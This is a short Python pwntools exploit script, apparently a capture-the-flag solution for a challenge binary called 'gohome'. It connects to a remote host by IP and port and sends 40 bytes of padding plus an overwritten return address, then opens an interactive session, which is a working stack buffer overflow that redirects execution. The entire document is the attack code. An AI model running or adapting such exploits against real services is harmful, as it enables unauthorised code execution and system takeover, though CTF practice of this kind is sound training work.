from pwn import *
#r = process("./gohome")
r = remote("120.114.62.211", 6126)
payload= b"A"*40
payload+=p64(0x00000000004006c6)

r.recvuntil(b"?")
r.sendline(payload)
r.interactive()
